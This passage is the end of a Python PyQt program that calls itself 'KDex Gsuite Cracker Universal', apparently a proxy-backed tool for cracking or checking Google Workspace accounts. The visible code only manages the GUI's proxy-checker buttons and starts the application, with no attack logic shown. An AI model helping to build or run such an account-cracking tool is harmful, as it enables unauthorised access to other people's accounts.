            self.log_signal.emit('proxy', f"Error: {str(e)}", 'red')
            QTimer.singleShot(0, self.on_proxy_checker_complete)
            
    def pause_proxy_checking(self):
        if self.proxy_checker.paused:
            self.proxy_checker.resume()
            self.proxy_pause_btn.setText("⏸️ Pause")
        else:
            self.proxy_checker.pause()
            self.proxy_pause_btn.setText("▶️ Resume")
            
    def stop_proxy_checking(self):
        self.proxy_checker.stop()
        self.on_proxy_checker_complete()
        
    def on_proxy_checker_complete(self):
        self.proxy_start_btn.setEnabled(True)
        self.proxy_pause_btn.setEnabled(False)
        self.proxy_stop_btn.setEnabled(False)
        self.proxy_pause_btn.setText("⏸️ Pause")




def main():
    app = QApplication(sys.argv)
    app.setStyle('Fusion')
    
    app.setApplicationName("KDex Gsuite Cracker Universal")
    app.setApplicationVersion("4.0")
    app.setOrganizationName("KDex")
    
    window = UniversalCheckerGUI()
    window.show()
    
    sys.exit(app.exec_())


if __name__ == "__main__":
    main()
